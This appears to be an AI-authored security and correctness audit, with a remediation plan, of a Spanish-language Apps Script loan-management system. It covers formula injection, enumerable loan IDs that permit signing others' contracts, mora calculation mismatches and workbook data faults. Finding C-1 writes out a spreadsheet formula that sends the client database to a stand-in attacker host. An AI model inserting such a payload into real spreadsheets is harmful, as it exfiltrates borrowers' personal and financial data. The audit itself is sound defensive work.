# Impulso Crédito — Full Audit & Remediation Plan

**Date:** 2026-10-20
**Auditor:** Claude (Opus 4.8)
**Scope:** `LoanManagerV2.gs` (~9,175 lines), `Validaciones.gs`, `Reactivar.gs`, and the production workbook `impulso-v2 (20).xlsx`. `SignatureData.gs` excluded (data-only).
**Method:** three parallel deep code reviews (money/mora engine; web-app security + approval rules; data-model/triggers/notifications) + structural read of the workbook. Money findings were verified with numeric simulation of the engine.

> ⚠️ This document describes exploitable vulnerabilities (formula injection, ID enumeration, signing bypass). Treat as sensitive. Fix the Critical items before the next public-form campaign.

Context: the workbook's own **"Errores encontrados"** sheet records past *CRÍTICA* data incidents (lost payment records, loans showing $0, negative available cash) already marked "Corrección aplicada" — hence data-integrity safeguards are weighted heavily here.

Severity key: **actively exploitable now** vs **latent** (currently masked by the migrated column layout / `Migracion.gs` enforcing the first 23 columns, but fragile).

---

## 🔴 Critical

### C-1 · Spreadsheet formula injection via borrower-supplied text — *exploitable now*
User strings (name, address, notes, reference names, `payDetails`) are written to `Nuevos Prestatarios`/`Clientes`/`Pagos` with **no neutralization of a leading `=`,`+`,`-`,`@`**.
Refs: `Validaciones.gs` submit ~`:673-709`; writer `setSheetFieldByHeader_` `LoanManagerV2.gs:8084`; name validator only enforces length (`Validaciones.gs:571`).
Impact: a name like `=IMPORTXML("https://evil/?x="&TEXTJOIN(",",1,Clientes!A:A),"//a")` executes when the sheet is opened → exfiltrates the client DB (DNIs, emails, phones, balances) or plants a phishing `=HYPERLINK`.
Fix: add `safeCell_(s)` prefixing a leading formula char with `'`; apply to every user string before `setValue`/`appendRow` (incl. `setSheetFieldByHeader_`, `appendCliente_`). ~1 helper + ~8 call sites.

### C-2 · Enumerable loan IDs + DNI-only auth → view others' PII, sign others' contracts — *exploitable now*
IDs are sequential (`nextLoanId_` → `L-0001…`). Every self-service endpoint authorizes on `loanId + DNI` only, no rate limiting: `lookupBalance` `:5309`, `getContractForSigning` `:6031`, `submitSignature` `:6052`, `lookupFreezeLoan` `:5468`, `submitFreezeRequest` `:5499`, plan equivalents.
Impact: iterate IDs + a known/low-entropy DNI to read another borrower's balance/contract PII and **electronically sign someone else's loan** (binding contract, starts interest clock, emails signed PDF).
Fix: random 128-bit per-loan token stored on the loan row, embedded in emailed `?page=…&loan=…&t=…` links, required server-side (with DNI). Add `CacheService` throttling/lockout. Single highest-impact fix; closes C-2 + the signing exposure together.

### C-3 · Mora inconsistent across documents for 3-installment (90-day) loans — *correctness, verified*
Engine (`accruedMora_`→`computeOutstanding_`) accrues mora **per cuota** from each installment's due date; the "Estudio de Estados" sheet formula and `chargedMora_` (statement PDF) compute **whole-loan** mora off the single final due date.
Verified (principal 100k, 100%, 5%/day): day 35 → engine `$16.666` vs statement `$0`; day 92 → `$100k` vs `$20k`. "Saldo con Mora" (collected) and the borrower's statement PDF disagree by tens of thousands ARS; early-installment mora is invisible in "Pagos Atrasados" until day 90.
Refs: `loanSchedule_` `:3374`, `computeOutstanding_` `:3411-3436`, `chargedMora_` `:3615`, Estados formula `:1600-1618`, `rebuildLateSheet_` filter `:3254`.
Fix: pick one authoritative model (recommend per-cuota engine); make `chargedMora_`, the Estados cells, and the "listed/días de atraso" filter all derive from it. **Needs owner decision on the intended rule.**

---

## 🟠 High

### H-1 · Reminder / Mercado Pago emails can demand the full balance instead of the installment due
`enviarAvisosVencimiento` uses `PB.BALANCE` (whole balance) and keys milestones off the **final** due date, while `rebuildRemindersSheet_` uses the **next unpaid cuota**. For 3-installment loans the email "Monto a pagar" — and the **MP transfer amount** added 2026-10-20 — overstates what's due. Refs: `LoanManagerV2.gs:7650/7657`.
Fix: mirror `rebuildRemindersSheet_` — use the next unpaid installment's amount + due date when a schedule exists.

### H-2 · Mora cap base inconsistent (principal vs total a devolver)
Setting labeled "% del total a devolver" but `moraCapAmount_` caps on **principal** (`:329`) while `chargedMora_` caps on **totalDue** (`:3630`); internal per-cuota cap uses cuota total (`:3418`).
Fix: choose one base (label implies `totalDue`) and use it in `moraCapAmount_`, `chargedMora_`, the Estados `$B$9` ref, and the per-cuota cap.

### H-3 · Single-payment engine ignores stored due date at month boundaries
`computeOutstanding_` rebuilds its due date via `addMonths_` (`:3411`) instead of the stored `addDays_`-based `Vencimiento`. Jan 31 + 30-day → stored Mar 2 vs engine Feb 28 → ~2 days spurious mora.
Fix: pass the real `loan.dueDate` into the engine instead of recomputing.

### H-4 · Approval caps checked outside the lock (TOCTOU → caps breached)
`approveApplicantV2_` validates max-loans/fund/concentration/graduation **before** the lock (`Reactivar.gs:1024` vs lock `:1072`). Two different pending rows for one client approved concurrently both pass and both insert.
Fix: re-read + re-validate caps **inside** the lock before insert; invalidate client/header caches at the top of the locked section.

### H-5 · `rebuildRemindersSheet_` reads balance by raw `PB.BALANCE` — *latent*
`:1771` bypasses header resolution used by every sibling column. A single inserted column → wrong/zero saldo on every reminder + broken próximo/vencido filter.
Fix (one line): `const balC = col(['Saldo Pendiente','Saldo Pendiente (hoy)'], PB.BALANCE);`

---

## 🟡 Medium
- **M-1 · Hardcoded `PB.*` in notification + onEdit paths** (`dailyTasks`, `enviarAvisosVencimiento` STATE/BALANCE/NOTICE; `onEditInstallable` DELETE/recalc `:6932`/`:6980`) — *latent*; convert to `colByAny_(…) || PB.*`.
- **M-2 · Shared `PB.NOTICE` dedup marker** across milestone/overdue/generic notices — can suppress a legitimately-due notice near state boundaries / after plan restructuring. Use a per-milestone marker.
- **M-3 · Per-day mora rounding** diverges between engine (`round2_` per day, `:3436`) and the sheet's single-multiply formula — cents, systematic. Round once, consistently.
- **M-4 · No clickjacking protection** on signing/freeze/plan HTML (`doGet` `:4965-4986` never sets `setXFrameOptionsMode(DENY)`), on legally-binding pages.
- **M-5 · Stale per-execution caches in batch approval** (`clientesRows_`) can under-count concurrent exposure in `procesarNuevosPrestatarios`. Invalidate before each applicant's validation.

## 🟢 Low / hardening
- **L-1** `esc_` doesn't escape `"`/`'` (`:8424`) — latent attribute-context XSS; extend it.
- **L-2** `guard_` (`:200`) rethrows raw errors to the public client — return a generic message, log detail.
- **L-3** "Anular límites" override bypasses every financial cap with only a mutable cell note — add an append-only audit log (timestamp, `Session.getActiveUser().getEmail()`, loanId, caps bypassed).
- **L-4** BCRA check is advisory (only blocks a pre-existing `RECHAZAR`) — make it an explicit, auditable choice.
- **L-5** Post-intake amount edits aren't re-capped against `loanMax_` in the approval path.

## 📒 Workbook data-integrity findings (from the xlsx)
- **W-1 · Duplicate/blank columns** that make index reads risky: `Firmas` has **CUIL & Domicilio twice**; `Clientes` has **"Ref 2 Teléfono" twice**; `Prestatarios` has **"Capital disponible (máx.)" twice** + blank mid-sheet columns. Can make `colByAny_` bind to the wrong occurrence — clean up.
- **W-2 · `Clientes` C-0002: raw email (`…avila68@`) ≠ normalized email (`…avila51@`)** — "Correo (norm)" holds a *different address*. Verify/repair; may misroute that client's email.
- **W-3 · `Rechazados` has no header row** (first row is data). Breaks header resolution if ever read by name.
- **W-4 · DNIs stored as numbers** (scientific notation). Safe today (a `DNI (norm)` column exists) but prefer text to avoid precision/format issues.

## ✅ Verified solid (not issues)
`TEST_MODE` intercepts all sends; `guard_` + per-row try/catch isolate failures; `LockService` + content-hash prevents duplicate-loan double-clicks; phone E.164→`wa.me` conversion and `round2_` correct; legacy month-based approval flow effectively unreachable.

---

## Remediation plan (phased, trackable)

### Phase 1 — Quick, low-risk, high-value (hours)
- [x] C-1 · `safeCell_` neutralizer on all user-written strings *(done 2026-10-20; `safeCell_` in LoanManagerV2.gs + 15 write sites; tested)*
- [ ] H-5 · one-line `balC` header resolution
- [ ] H-1 · installment-aware amount in avisos (drives the MP transfer amount)
- [ ] L-1 · extend `esc_` to escape `"`/`'`
- [ ] M-4 · `setXFrameOptionsMode(DENY)` on signing/freeze/plan outputs
- [ ] L-2 · generic client-facing error from `guard_`

### Phase 2 — Security hardening (small design choice)
- [ ] C-2 · per-loan token + DNI on self-service/signing endpoints; embed token in emailed links
- [ ] C-2 · `CacheService` throttling/lockout per IP+loanId
- [ ] L-3 · append-only override audit log

### Phase 3 — Money-model correctness (needs owner's rule decision)
- [ ] C-3 · unify mora model (recommend per-cuota) across engine, Estados sheet, Pagos Atrasados filter
- [ ] H-2 · single mora cap base everywhere
- [ ] H-3 · engine uses stored `loan.dueDate`
- [ ] M-3 · consistent per-day mora rounding

### Phase 4 — Robustness & cleanup
- [ ] H-4 / M-5 · approval caps + cache invalidation inside the lock
- [ ] M-1 · header-resolve remaining `PB.*` reads in notification/onEdit paths
- [ ] M-2 · per-milestone dedup marker
- [ ] L-4, L-5 · BCRA gate decision; re-cap amount at approval
- [ ] W-1…W-4 · workbook column cleanup; fix C-0002 email; add `Rechazados` header; DNIs→text

**Open decision for Phase 3:** which mora model is contractually intended for 3-installment loans — per-cuota (mora starts when each installment is late) or whole-loan (mora starts only after the final due date)? This determines the fix direction for C-3/H-2.
